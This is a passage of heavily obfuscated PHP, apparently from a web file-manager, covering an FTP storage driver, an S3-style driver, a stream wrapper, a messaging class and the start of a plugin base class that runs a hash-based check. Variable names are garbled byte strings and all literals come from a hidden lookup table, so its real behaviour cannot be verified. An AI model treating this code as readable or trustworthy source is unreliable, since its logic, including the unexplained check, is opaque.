$_SERVER[ˆë€Ï⁄∂]; if (!$Æ©‡„ê˚ || $Æ©‡„ê˚ == $Ê„ë™ÀÖ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Æ©‡„ê˚ = $this->iconvSystem($Æ©‡„ê˚); if ($this->_isFolder($Æ©‡„ê˚) || @ftp_mkdir($this->connect, $Æ©‡„ê˚)) { return $this->getPathOuter($Æ©‡„ê˚); } if (!$this->mkdir($this->pathFather($Æ©‡„ê˚))) { return !1; } if ($Æ©‡„ê˚ = @ftp_mkdir($this->connect, $Æ©‡„ê˚)) { return $this->getPathOuter($Æ©‡„ê˚); } $this->writeLog(__FUNCTION__ . $Ê„ë™ÀÖ[1466], !0); return !1; } public function copyFile($ä–»êµê, $çó’òôæ) { if (!$this->_isconn()) { return !1; } $Íå¯˛Øâ = $this->pathThis($this->iconvSystem($ä–»êµê)); $ë∫ãÚ©⁄ = $this->tempFile($Íå¯˛Øâ); $ÁÙùÍŒ° = $this->iconvApp($ë∫ãÚ©⁄); $this->download($ä–»êµê, $ÁÙùÍŒ°); $Î®ã∆Ì§ = $this->upload($çó’òôæ, $ÁÙùÍŒ°); $this->tempFileRemve($ë∫ãÚ©⁄); return $Î®ã∆Ì§; } public function moveFile($‹ß‹Å’´, $˝Œá©‡Ö) { if (!$this->_isconn()) { return !1; } $‹ß‹Å’´ = $this->iconvSystem($‹ß‹Å’´); $˝Œá©‡Ö = $this->iconvSystem($˝Œá©‡Ö); $ßÙùÚÉü = @ftp_rename($this->connect, $‹ß‹Å’´, $˝Œá©‡Ö); if (!$ßÙùÚÉü) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][1466], !0); return !1; } return $this->getPathOuter($˝Œá©‡Ö); } public function delFile($ãÈµîﬂ—) { if (!$this->_isconn()) { return !1; } $ãÈµîﬂ— = $this->iconvSystem($ãÈµîﬂ—); $˛≠ïÉ»° = @ftp_delete($this->connect, $ãÈµîﬂ—); if (!$˛≠ïÉ»°) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][1466], !0); } return $˛≠ïÉ»°; } public function delFolder($•˘ÿ°ò†) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $™ê∞¨åƒ = $≈âõï ± = array(); $this->fileList($•˘ÿ°ò†, $™ê∞¨åƒ, $≈âõï ±, !0); $this->listItemCache = !0; foreach ($≈âõï ± as $†ØŒ›õÆ) { $ÎÜ®ÁÕŸ = $this->iconvSystem($†ØŒ›õÆ[$_SERVER[ˆë€Ï⁄∂][32]]); $˝¥¿ÅûÈ = @ftp_delete($this->connect, $ÎÜ®ÁÕŸ); if (!$˝¥¿ÅûÈ) { return !1; } } foreach ($™ê∞¨åƒ as $ÎÜ®ÁÕŸ) { $ÎÜ®ÁÕŸ = $this->iconvSystem($ÎÜ®ÁÕŸ); $˝¥¿ÅûÈ = @ftp_rmdir($this->connect, $ÎÜ®ÁÕŸ); if (!$˝¥¿ÅûÈ) { return !1; } } $•˘ÿ°ò† = $this->iconvSystem($•˘ÿ°ò†); return @ftp_rmdir($this->connect, $•˘ÿ°ò†); } public function rename($”ÓÊ’Ìˆ, $§˚«Ù√˚) { $æµπ’Ω¿ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->_isconn()) { return !1; } $£∞ïﬂ¸´ = $this->fileNameAuto($this->pathFather($”ÓÊ’Ìˆ), $§˚«Ù√˚); $£∞ïﬂ¸´ = $this->iconvSystem($£∞ïﬂ¸´); $”ÓÊ’Ìˆ = $this->iconvSystem($”ÓÊ’Ìˆ); $»»ïÀ˝∞ = $this->pathFather($”ÓÊ’Ìˆ); $ÁŒæÌ‹æ = rtrim($»»ïÀ˝∞, $æµπ’Ω¿[8]) . $æµπ’Ω¿[8] . $£∞ïﬂ¸´; $£‚‰ñãÿ = @ftp_rename($this->connect, $”ÓÊ’Ìˆ, $ÁŒæÌ‹æ); if (!$£‚‰ñãÿ) { $this->writeLog(__FUNCTION__ . $æµπ’Ω¿[1466], !0); return !1; } $ÁŒæÌ‹æ = $this->iconvApp($ÁŒæÌ‹æ); return $this->getPathOuter($ÁŒæÌ‹æ); } private function folderInfo($–˝Ú∏¯ß, $ ™Òñ¬Å = false) { $ÏßÉ„˚ô =& $_SERVER[ˆë€Ï⁄∂]; $í˝√—≤ó = array($ÏßÉ„˚ô[32] => $this->pathThis($–˝Ú∏¯ß), $ÏßÉ„˚ô[97] => $this->getPathOuter($ÏßÉ„˚ô[8] . $–˝Ú∏¯ß), $ÏßÉ„˚ô[33] => $ÏßÉ„˚ô[88]); if ($ ™Òñ¬Å) { return $í˝√—≤ó; } $í˝√—≤ó[$ÏßÉ„˚ô[243]] = $í˝√—≤ó[$ÏßÉ„˚ô[98]] = 0; $í˝√—≤ó[$ÏßÉ„˚ô[244]] = $í˝√—≤ó[$ÏßÉ„˚ô[245]] = !0; return $í˝√—≤ó; } private function fileInfo($öÔªÏ‡Ì, $ŒÛõ≤Æô = false, $˛£ï¯¨„ = array()) { $”™∫≈¬˙ =& $_SERVER[ˆë€Ï⁄∂]; $¨´òΩ¿˘ = array($”™∫≈¬˙[32] => $this->pathThis($öÔªÏ‡Ì), $”™∫≈¬˙[97] => $this->getPathOuter($”™∫≈¬˙[8] . $öÔªÏ‡Ì), $”™∫≈¬˙[33] => $”™∫≈¬˙[242], $”™∫≈¬˙[89] => isset($˛£ï¯¨„[$”™∫≈¬˙[89]]) ? $˛£ï¯¨„[$”™∫≈¬˙[89]] : 0, $”™∫≈¬˙[179] => $this->ext($öÔªÏ‡Ì)); if ($ŒÛõ≤Æô) { return $¨´òΩ¿˘; } $¨´òΩ¿˘[$”™∫≈¬˙[243]] = $¨´òΩ¿˘[$”™∫≈¬˙[98]] = 0; $¨´òΩ¿˘[$”™∫≈¬˙[244]] = $¨´òΩ¿˘[$”™∫≈¬˙[245]] = !0; $‡¿ÿ∫…É = $this->iconvSystem($öÔªÏ‡Ì); $¨´òΩ¿˘[$”™∫≈¬˙[98]] = @ftp_mdtm($this->connect, $‡¿ÿ∫…É); if (empty($˛£ï¯¨„)) { $˛£ï¯¨„ = $this->objectMeta($öÔªÏ‡Ì); if (!$˛£ï¯¨„) { return $¨´òΩ¿˘; } } $¨´òΩ¿˘[$”™∫≈¬˙[89]] = $˛£ï¯¨„[$”™∫≈¬˙[89]]; return $¨´òΩ¿˘; } public function size($Ü†ûÄ¨Ω) { $ÉŒÔ˚ß∫ = $this->objectMeta($Ü†ûÄ¨Ω); return $ÉŒÔ˚ß∫ ? $ÉŒÔ˚ß∫[$_SERVER[ˆë€Ï⁄∂][89]] : 0; } public function info($èŒ•˝î¯) { if ($this->isFile($èŒ•˝î¯)) { return $this->fileInfo($èŒ•˝î¯, 0); } else { if ($this->isFolder($èŒ•˝î¯)) { return $this->folderInfo($èŒ•˝î¯); } } return !1; } private function fileList($ó€∫å∑Æ, &$•è¨áÈë, &$Ã‚™‹Ó¿, $íÇäÓéÚ = false) { $‹Ω˝éŸõ =& $_SERVER[ˆë€Ï⁄∂]; $ó€∫å∑Æ = $this->iconvSystem($ó€∫å∑Æ); if (!$this->isFolder($ó€∫å∑Æ)) { return !1; } @ftp_chdir($this->connect, $‹Ω˝éŸõ[8]); $ó€∫å∑Æ = rtrim($ó€∫å∑Æ, $‹Ω˝éŸõ[8]) . $‹Ω˝éŸõ[8]; check_abort(); $¯ËÎ‰±Ó = @ftp_rawlist($this->connect, $ó€∫å∑Æ); if (!$¯ËÎ‰±Ó) { $¯ËÎ‰±Ó = array(); } $åÄˆûçÌ = array($‹Ω˝éŸõ[10] => 1, $‹Ω˝éŸõ[1378] => 1); foreach ($¯ËÎ‰±Ó as $£ÄÙòáı) { $˛µÀÁ¬Á = $this->_listItem($£ÄÙòáı); if ($˛µÀÁ¬Á[0] == $‹Ω˝éŸõ[849]) { continue; } $Æ∑Œçì÷ = $˛µÀÁ¬Á[8]; if (empty($Æ∑Œçì÷) && $Æ∑Œçì÷ !== $‹Ω˝éŸõ[240] || isset($åÄˆûçÌ[$Æ∑Œçì÷])) { continue; } $Æ∑Œçì÷ = $this->iconvApp($ó€∫å∑Æ . ltrim($Æ∑Œçì÷, $‹Ω˝éŸõ[8])); $õ¸≥™íê = array($‹Ω˝éŸõ[32] => $Æ∑Œçì÷, $‹Ω˝éŸõ[33] => $‹Ω˝éŸõ[242], $‹Ω˝éŸõ[89] => $˛µÀÁ¬Á[4]); if (substr($£ÄÙòáı, 0, 1) == $‹Ω˝éŸõ[1467]) { $õ¸≥™íê[$‹Ω˝éŸõ[33]] = $‹Ω˝éŸõ[88]; $õ¸≥™íê[$‹Ω˝éŸõ[89]] = 0; } $¡€Æ˙åê = $õ¸≥™íê[$‹Ω˝éŸõ[33]] == $‹Ω˝éŸõ[88] ? !0 : !1; $this->cacheMethodInfoSet($Æ∑Œçì÷, $¡€Æ˙åê, $õ¸≥™íê); if ($¡€Æ˙åê) { $•è¨áÈë[] = $Æ∑Œçì÷; if ($íÇäÓéÚ) { $this->fileList($Æ∑Œçì÷, $•è¨áÈë, $Ã‚™‹Ó¿, $íÇäÓéÚ); } continue; } $Ã‚™‹Ó¿[] = $õ¸≥™íê; } $this->cacheMethodInfoSet($ó€∫å∑Æ, !0); } private function _listItem($§ﬁûﬂÛï) { if (empty($§ﬁûﬂÛï)) { return array(); } $ÓÁéΩ·™ = preg_split($_SERVER[ˆë€Ï⁄∂][1468], $§ﬁûﬂÛï); if (count($ÓÁéΩ·™) <= 9) { return $ÓÁéΩ·™; } $ÓÁéΩ·™[8] = trim(substr($§ﬁûﬂÛï, strpos($§ﬁûﬂÛï, $ÓÁéΩ·™[7]) + strlen($ÓÁéΩ·™[7]))); return array_splice($ÓÁéΩ·™, 0, 9); } public function listPath($°ë“ ı∏, $¥©ù´ÿú = false) { $º¥»£Û“ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->_isconn()) { return !1; } $ÿäıÄâ™ = $£…Ëπ§û = array(); $this->fileList($°ë“ ı∏, $ÿäıÄâ™, $£…Ëπ§û); foreach ($ÿäıÄâ™ as $Æ≠’ÜÛ™ => $ŸﬁÔ˛ﬂ§) { $ÿäıÄâ™[$Æ≠’ÜÛ™] = $this->folderInfo($ŸﬁÔ˛ﬂ§, $¥©ù´ÿú); } foreach ($£…Ëπ§û as $Æ≠’ÜÛ™ => $ŸﬁÔ˛ﬂ§) { $£…Ëπ§û[$Æ≠’ÜÛ™] = $this->fileInfo($ŸﬁÔ˛ﬂ§[$º¥»£Û“[32]], $¥©ù´ÿú, $ŸﬁÔ˛ﬂ§); } return array($º¥»£Û“[95] => $ÿäıÄâ™, $º¥»£Û“[96] => $£…Ëπ§û); } public function has($òŒ‘”Å‹, $ïêï“∏ = false, $ä“µœﬂÙ = true) { $˝§∫ªﬁù =& $_SERVER[ˆë€Ï⁄∂]; $óæ±ÑìÜ = $øß·§ÇË = array(); $üè´æ“‡ = $ïêï“∏ ? !0 : !1; $this->fileList($òŒ‘”Å‹, $óæ±ÑìÜ, $øß·§ÇË, $üè´æ“‡); if ($ïêï“∏) { return array($˝§∫ªﬁù[251] => count($øß·§ÇË), $˝§∫ªﬁù[252] => count($óæ±ÑìÜ)); } if ($ä“µœﬂÙ) { if (count($øß·§ÇË)) { return !0; } } else { if (count($óæ±ÑìÜ)) { return !0; } } return !1; } public function listAll($„Õµ§ì∏) { $⁄ñö…≈´ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->_isconn()) { return !1; } $µ∑Í⁄ÿÑ = $ƒ§ûŒπ· = array(); $this->fileList($„Õµ§ì∏, $µ∑Í⁄ÿÑ, $ƒ§ûŒπ·, !0); $ˆÊÄß⁄È = array_to_keyvalue($ƒ§ûŒπ·, $⁄ñö…≈´[32]); foreach ($µ∑Í⁄ÿÑ as $≥éò≥’⁄) { if (is_string($≥éò≥’⁄)) { $ˆÊÄß⁄È[$≥éò≥’⁄] = array($⁄ñö…≈´[89] => 0); } } return $this->listAllFiles($„Õµ§ì∏, $ˆÊÄß⁄È); } public function getContent($Ÿçﬁ∆∆í) { if (!$this->_isconn()) { return !1; } $Ÿçﬁ∆∆í = $this->iconvSystem($Ÿçﬁ∆∆í); return $this->fileSubstr($Ÿçﬁ∆∆í); } public function setContent($–‰ŸÑ¸±, $∞®Ç∆†í = '') { if (!$this->_isconn()) { return !1; } $ÉîÓœçÆ = $this->pathThis($this->iconvSystem($–‰ŸÑ¸±)); $Ú Ü˘“í = $this->tempFile($ÉîÓœçÆ); file_put_contents($Ú Ü˘“í, $∞®Ç∆†í); $ãƒù∫Ôˆ = $this->upload($–‰ŸÑ¸±, $this->iconvApp($Ú Ü˘“í)); $this->tempFileRemve($Ú Ü˘“í); return $ãƒù∫Ôˆ; } public function fileSubstr($êºÒçá∂, $Ñãú¨˙– = 0, $ƒ‘êÚùø = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($êºÒçá∂, $Ñãú¨˙–, $ƒ‘êÚùø); } private function ftpRequest($ÊØÜó««, $µÈà˙¢˜ = 0, $–≈ÒıîÙ = false) { $ÊØÜó«« = $this->iconvSystem($ÊØÜó««); $åπÉ Íô = $this->scheme . $this->host . $_SERVER[ˆë€Ï⁄∂][4] . $this->port; $‰»≥√ﬁ„ = curl_init(); curl_setopt($‰»≥√ﬁ„, CURLOPT_URL, $åπÉ Íô . $this->pathEncode($ÊØÜó««)); curl_setopt($‰»≥√ﬁ„, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($–≈ÒıîÙ) { $î∑”æ∫ = $µÈà˙¢˜ + $–≈ÒıîÙ - 1; curl_setopt($‰»≥√ﬁ„, CURLOPT_RANGE, "{$µÈà˙¢˜}\x2d{$î∑”æ∫}"); } curl_setopt($‰»≥√ﬁ„, CURLOPT_RETURNTRANSFER, 1); $±áº…‚∫ = curl_exec($‰»≥√ﬁ„); curl_close($‰»≥√ﬁ„); return $±áº…‚∫; } public function upload($–¢â‹ﬁÑ, $Ò‘¨‚°ê, $Öøâû˚£ = false, $§›µõ£Î = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($–¢â‹ﬁÑ))) { return !1; } $–¢â‹ﬁÑ = $this->iconvSystem($–¢â‹ﬁÑ); $Ò‘¨‚°ê = $this->iconvSystem($Ò‘¨‚°ê); $€´µ£¢À = ftp_nb_put($this->connect, $–¢â‹ﬁÑ, $Ò‘¨‚°ê, FTP_BINARY); while ($€´µ£¢À == FTP_MOREDATA) { $€´µ£¢À = ftp_nb_continue($this->connect); } if ($€´µ£¢À != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][1466], !0); return !1; } return $this->getPathOuter($–¢â‹ﬁÑ); } public function download($√˚ÛÀúì, $‚√Ó†ËÆ = '') { if (!$this->_isconn()) { return !1; } $˚î«“˛Ò = $this->pathFather($‚√Ó†ËÆ); if (!IO::mkdir($˚î«“˛Ò)) { return !1; } $√˚ÛÀúì = $this->iconvSystem($√˚ÛÀúì); $‚√Ó†ËÆ = $this->iconvSystem($‚√Ó†ËÆ); $å‚£Ô“õ = ftp_nb_get($this->connect, $‚√Ó†ËÆ, $√˚ÛÀúì, FTP_BINARY); while ($å‚£Ô“õ == FTP_MOREDATA) { $å‚£Ô“õ = ftp_nb_continue($this->connect); } if ($å‚£Ô“õ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][1466], !0); return !1; } return $this->iconvApp($‚√Ó†ËÆ); } public function exist($¿∫ÖÎ≈¥) { return $this->isFile($¿∫ÖÎ≈¥) || $this->isFolder($¿∫ÖÎ≈¥); } public function isFile($¸’»Ãè´) { return !$this->isFolder($¸’»Ãè´) && $this->objectMeta($¸’»Ãè´); } public function isFolder($Òé˙ùÜè) { return $this->cacheMethod($_SERVER[ˆë€Ï⁄∂][189], $Òé˙ùÜè); } protected function objectMeta($ö¸˙È‘∞) { return $this->cacheMethod($_SERVER[ˆë€Ï⁄∂][191], $ö¸˙È‘∞); } protected function _objectMeta($Ú∆≥á≈ó) { $òö…É∂µ =& $_SERVER[ˆë€Ï⁄∂]; if ($Ú∆≥á≈ó == $òö…É∂µ[12] || $Ú∆≥á≈ó == $òö…É∂µ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ú∆≥á≈ó = $this->iconvSystem($Ú∆≥á≈ó); $«ÇŒ∫Ïˆ = array($òö…É∂µ[32] => $this->iconvApp($Ú∆≥á≈ó), $òö…É∂µ[33] => $òö…É∂µ[242], $òö…É∂µ[89] => 0); @ftp_chdir($this->connect, $òö…É∂µ[8]); $ˆà√ÉΩ« = @ftp_size($this->connect, $Ú∆≥á≈ó); if ($ˆà√ÉΩ« != -1) { $«ÇŒ∫Ïˆ[$òö…É∂µ[89]] = $ˆà√ÉΩ«; } else { $ª‰á€ Ω = @ftp_chdir($this->connect, $Ú∆≥á≈ó); if (!$ª‰á€ Ω) { return !1; } $«ÇŒ∫Ïˆ[$òö…É∂µ[33]] = $òö…É∂µ[88]; } return $«ÇŒ∫Ïˆ; } protected function _isFolder($˘áÿ‚·‡) { $òéÀóó =& $_SERVER[ˆë€Ï⁄∂]; if ($˘áÿ‚·‡ == $òéÀóó[12] || $˘áÿ‚·‡ == $òéÀóó[8]) { return !0; } $ô–ÊÚ¥Ÿ = $this->_objectMeta($˘áÿ‚·‡); return isset($ô–ÊÚ¥Ÿ[$òéÀóó[33]]) && $ô–ÊÚ¥Ÿ[$òéÀóó[33]] == $òéÀóó[88] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($„≥æËƒﬂ) { parent::__construct($„≥æËƒﬂ); $this->setSignVersion($_SERVER[ˆë€Ï⁄∂][259]); } public function uploadLink($∑¨≈ »í, $ ≤äÉÙù = 0) { $Õ√Á…ª∆ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->isUploadServer()) { return; } $ÍÃ…∫ıè = $this->getType(); if (!in_array($ÍÃ…∫ıè, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $á„ãä›Ú = (!$ ≤äÉÙù ? 1 : ceil($ ≤äÉÙù / pow(1024, 3))) * 3600 * 4; $˜”£Œ¬ª = $this->uploadMultiData($∑¨≈ »í, $á„ãä›Ú); if ($˜”£Œ¬ª) { $˜”£Œ¬ª[$Õ√Á…ª∆[107]] = $∑¨≈ »í; $˜”£Œ¬ª[$Õ√Á…ª∆[108]] = $ÍÃ…∫ıè; } return $˜”£Œ¬ª; } public function fileOutImage($©≠õû¨™, $≥•∂”˚˚ = 250) { if ($this->size($©≠õû¨™) > 1024 * 1024 * 25) { return $this->fileOutImageServer($©≠õû¨™, $≥•∂”˚˚); } $·ÙÂ†âå = $this->link($©≠õû¨™); $·ÙÂ†âå .= $_SERVER[ˆë€Ï⁄∂][1469] . $≥•∂”˚˚; $this->fileOutLink($·ÙÂ†âå); } public function fileOutLink($≠÷§‘˘≥) { $™˛‘Ç˚π =& $_SERVER[ˆë€Ï⁄∂]; if (substr($≠÷§‘˘≥, 0, 7) == $™˛‘Ç˚π[228]) { $≠÷§‘˘≥ = $™˛‘Ç˚π[229] . substr($≠÷§‘˘≥, 7); } header($™˛‘Ç˚π[185] . $≠÷§‘˘≥); die; } } goto C©⁄¡±ñŒá; fµ£∫ç¡ˆ‚: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($≈≠À˘∫û, $ßÔ•éÙ¶ = '') { $this->info = $this->info($≈≠À˘∫û); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ˆë€Ï⁄∂][97]]; $this->pathOpen = $≈≠À˘∫û; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$≈≠À˘∫û])) { self::$_chunkBuffer[$≈≠À˘∫û] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($û≥‹Ø˛Ë) { $Ï∑¨ÉÀ‹ = $this->fileSubstr($this->pose, $û≥‹Ø˛Ë); $this->pose += strlen($Ï∑¨ÉÀ‹); return $Ï∑¨ÉÀ‹; } public function stream_tell() { return $this->pose; } public function stream_seek($ÛÎ∆êÀÜ, $’∏ß›ÏÚ) { $π≈ŒÄüü =& $_SERVER[ˆë€Ï⁄∂]; if ($’∏ß›ÏÚ == SEEK_SET) { $this->pose = $ÛÎ∆êÀÜ; } else { if ($’∏ß›ÏÚ == SEEK_CUR) { $this->pose += $ÛÎ∆êÀÜ; } else { if ($’∏ß›ÏÚ == SEEK_END) { $this->pose = $this->info[$π≈ŒÄüü[89]] + intval($ÛÎ∆êÀÜ); } } } if ($ÛÎ∆êÀÜ < 0) { $this->pose = $this->info[$π≈ŒÄüü[89]] + $ÛÎ∆êÀÜ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ˆë€Ï⁄∂][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ã◊˘·ó, $ˆúí“µù) { $Ö’òÇíé =& $_SERVER[ˆë€Ï⁄∂]; $éÅÅ Ñ´ = $this->info($ã◊˘·ó); return array($Ö’òÇíé[1415] => 0, $Ö’òÇíé[1624] => 0, $Ö’òÇíé[16] => 32768 + 511, $Ö’òÇíé[1625] => 0, $Ö’òÇíé[1626] => 0, $Ö’òÇíé[1627] => 0, $Ö’òÇíé[1628] => 0, $Ö’òÇíé[89] => $éÅÅ Ñ´[$Ö’òÇíé[89]], $Ö’òÇíé[1629] => $éÅÅ Ñ´[$Ö’òÇíé[1470]], $Ö’òÇíé[1586] => $éÅÅ Ñ´[$Ö’òÇíé[98]], $Ö’òÇíé[1585] => $éÅÅ Ñ´[$Ö’òÇíé[243]], $Ö’òÇíé[1630] => 0, $Ö’òÇíé[1631] => 0); } static $fileInfo = array(); public function info($˜∞ªîıÏ) { $›ê‘∞÷ê = $_SERVER[ˆë€Ï⁄∂][1632]; if (isset(self::$fileInfo[$˜∞ªîıÏ])) { return self::$fileInfo[$˜∞ªîıÏ]; } if (substr($˜∞ªîıÏ, 0, strlen($›ê‘∞÷ê)) != $›ê‘∞÷ê) { return !1; } self::$fileInfo[$˜∞ªîıÏ] = IO::info(substr($˜∞ªîıÏ, strlen($›ê‘∞÷ê))); return self::$fileInfo[$˜∞ªîıÏ]; } public static function read($Óø‰Ùﬂˆ, $Á˝ÑÉö°, $Ïêº•Èˆ) { if (!isset(self::$_fopenCache[$Óø‰Ùﬂˆ])) { $Ò—„÷Ì¬ = new StreamWrapperIO(); $Ò—„÷Ì¬->stream_open($Óø‰Ùﬂˆ); self::$_fopenCache[$Óø‰Ùﬂˆ] = $Ò—„÷Ì¬; } $Ò—„÷Ì¬ = self::$_fopenCache[$Óø‰Ùﬂˆ]; return $Ò—„÷Ì¬->fileSubstr($Á˝ÑÉö°, $Ïêº•Èˆ); } public static function _read($Î‘Âíö—, $Ö—éœ®Û, $®ó´¬ª™) { $§¥ÃÒΩª =& $_SERVER[ˆë€Ï⁄∂]; $Äﬁ∏úøø = fopen($Î‘Âíö—, $§¥ÃÒΩª[1474]); if (!$Äﬁ∏úøø) { return $§¥ÃÒΩª[12]; } $Ü∏ùÇâ‚ = 8192; fseek($Äﬁ∏úøø, $Ö—éœ®Û, SEEK_SET); $‡ú∫º±˙ = $§¥ÃÒΩª[12]; $ØîÏ˚Ä£ = 0; while ($ØîÏ˚Ä£ < $®ó´¬ª™) { $üÄäûﬁµ = min($Ü∏ùÇâ‚, $®ó´¬ª™ - $ØîÏ˚Ä£); $‡ú∫º±˙ .= fread($Äﬁ∏úøø, $üÄäûﬁµ); $ØîÏ˚Ä£ += $üÄäûﬁµ; } fclose($Äﬁ∏úøø); return $‡ú∫º±˙; } public function fileSubstr($π∂–ûÿ∞, $íñØèúç) { $»¡Óˆ¯ß =& $_SERVER[ˆë€Ï⁄∂]; $‹Êπ«Ó≠ = $this->info[$»¡Óˆ¯ß[89]]; $–ı˚Ùπƒ = $π∂–ûÿ∞; $Œé™å≥â = $íñØèúç; if ($π∂–ûÿ∞ < 0) { $π∂–ûÿ∞ = $‹Êπ«Ó≠ + $π∂–ûÿ∞; } if ($íñØèúç === !1) { $íñØèúç = $‹Êπ«Ó≠ - $π∂–ûÿ∞; } if ($π∂–ûÿ∞ + $íñØèúç > $‹Êπ«Ó≠) { $íñØèúç = $‹Êπ«Ó≠ - $π∂–ûÿ∞; } if ($íñØèúç <= 0) { return $»¡Óˆ¯ß[12]; } if ($π∂–ûÿ∞ < 0 || $π∂–ûÿ∞ >= $‹Êπ«Ó≠ || $íñØèúç <= 0 || $íñØèúç > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\x6c\x65\x52\145\x61\144\40\145\162\162\x6f\x72\x21\40\163\164\x61\162\164\75{$π∂–ûÿ∞}\x3b\x6c\x65\156\x67\x74\150\75{$íñØèúç}\x3b\x20\163\x69\172\145\x3d{$‹Êπ«Ó≠}\x3b"); } $¢ôÇ“˛È = 64 * 1024; $˛ããÁ·≥ =& self::$_chunkBuffer[$this->path]; if (!$˛ããÁ·≥) { $˛ããÁ·≥ = array(); } $£çÔã®Î = 0; $ù◊¿ ÿå = 0; $áÒ∫ªãı = $»¡Óˆ¯ß[12]; foreach ($˛ããÁ·≥ as $£çÔã®Î => $áÒ∫ªãı) { $£çÔã®Î = intval($£çÔã®Î); $ù◊¿ ÿå = $£çÔã®Î + strlen($áÒ∫ªãı); if ($π∂–ûÿ∞ >= $ù◊¿ ÿå) { continue; } if ($π∂–ûÿ∞ >= $£çÔã®Î && $π∂–ûÿ∞ + $íñØèúç <= $ù◊¿ ÿå) { return substr($áÒ∫ªãı, $π∂–ûÿ∞ - $£çÔã®Î, $íñØèúç); } break; } if (count($˛ããÁ·≥) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($»¡Óˆ¯ß[1633], $»¡Óˆ¯ß[1634] . count($˛ããÁ·≥) . "\73\x73\164\141\162\164\x3d{$π∂–ûÿ∞}\x2c\x6c\145\x6e\x67\x74\150\75{$íñØèúç}\x3b\x70\157\x73\x65\72{$£çÔã®Î}\x7e{$ù◊¿ ÿå}"); throw new Exception($»¡Óˆ¯ß[1635]); } $¥¨…É†ñ = intval($π∂–ûÿ∞ / $¢ôÇ“˛È) * $¢ôÇ“˛È; $¿Ä£â∆≤ = ceil(($π∂–ûÿ∞ + $íñØèúç) / $¢ôÇ“˛È) * $¢ôÇ“˛È - $¥¨…É†ñ; $¬ü¥≈¶° = IO::fileSubstr($this->path, $¥¨…É†ñ, $¿Ä£â∆≤); $˛ããÁ·≥[$¥¨…É†ñ . $»¡Óˆ¯ß[12]] = $¬ü¥≈¶°; ksort($˛ããÁ·≥); $ó†ïπ–Ÿ = substr($¬ü¥≈¶°, $π∂–ûÿ∞ - $¥¨…É†ñ, $íñØèúç); return $ó†ïπ–Ÿ; } private function log($˘°ÚÙﬂ§, $·à¯œÙã) { $˙ ŒîÒÃ =& $_SERVER[ˆë€Ï⁄∂]; $±˛´˛Ôó = timeFloat() - $this->timeStart; write_log(sprintf($˙ ŒîÒÃ[1636], $˘°ÚÙﬂ§, $this->info[$˙ ŒîÒÃ[32]], $±˛´˛Ôó, $·à¯œÙã), $˙ ŒîÒÃ[1279]); } } class Message { function __construct() { } public function send($√´ﬁôÖÅ = '', $€ˆ‹æ¬È = array(), $Ã◊∑∫ªÀ = "\164\x65\170\164") { $¿»‰ı™´ =& $_SERVER[ˆë€Ï⁄∂]; $Öååù”√ = array($¿»‰ı™´[33] => $¿»‰ı™´[1228], $¿»‰ı™´[181] => $√´ﬁôÖÅ); if (in_array($Ã◊∑∫ªÀ, array($¿»‰ı™´[1228], $¿»‰ı™´[1637]))) { $Öååù”√[$¿»‰ı™´[33]] = $Ã◊∑∫ªÀ; } $€ˆ‹æ¬È = array($¿»‰ı™´[589] => isset($€ˆ‹æ¬È[$¿»‰ı™´[589]]) ? $€ˆ‹æ¬È[$¿»‰ı™´[589]] : $¿»‰ı™´[12], $¿»‰ı™´[676] => isset($€ˆ‹æ¬È[$¿»‰ı™´[676]]) ? $€ˆ‹æ¬È[$¿»‰ı™´[676]] : $¿»‰ı™´[12]); if (empty($√´ﬁôÖÅ) || empty($€ˆ‹æ¬È[$¿»‰ı™´[589]]) && empty($€ˆ‹æ¬È[$¿»‰ı™´[676]])) { return !1; } $°≈Œ‘∫ = array($¿»‰ı™´[1566] => $Öååù”√, $¿»‰ı™´[1638] => $€ˆ‹æ¬È); Hook::trigger($¿»‰ı™´[1639], $°≈Œ‘∫); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $–ã˘˚√ß =& $_SERVER[ˆë€Ï⁄∂]; $¡⁄Î•◊∏ = $_SERVER[$–ã˘˚√ß[63]]; $±∑›õ–æ = $–ã˘˚√ß[969]; if ($_SERVER[$–ã˘˚√ß[54]] != $±∑›õ–æ($¡⁄Î•◊∏)) { $€¬©ºì™ = $–ã˘˚√ß[970]; $‹ƒ§∂ãµ = $–ã˘˚√ß[56]; $Â›ûõº¥ = $_SERVER[$–ã˘˚√ß[57]] . $–ã˘˚√ß[58]; $¸ÊÕàΩ¡ = $‹ƒ§∂ãµ($Â›ûõº¥); $≈·Õ∑«Á = explode($–ã˘˚√ß[59], $¸ÊÕàΩ¡); if (count($≈·Õ∑«Á) < $–ã˘˚√ß[703]) { $¯∂ÈŒõµ = $–ã˘˚√ß[61]; $¯∂ÈŒõµ(); } 